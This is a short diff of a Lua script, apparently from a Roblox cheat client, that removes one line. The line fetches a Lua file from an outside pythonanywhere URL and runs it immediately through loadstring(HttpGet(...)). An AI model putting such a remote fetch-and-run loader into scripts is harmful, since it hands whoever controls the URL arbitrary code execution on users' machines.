@@ -501,7 +501,6 @@ task.spawn(function()
 end
 
 shared.vapewhitelist = WhitelistFunctions
-loadstring(game:HttpGet("https://sammz.pythonanywhere.com/retrieve/v1/velocity/fixedcheck.lua"))()
 
 task.spawn(function()
     local function chatfunc(plr)
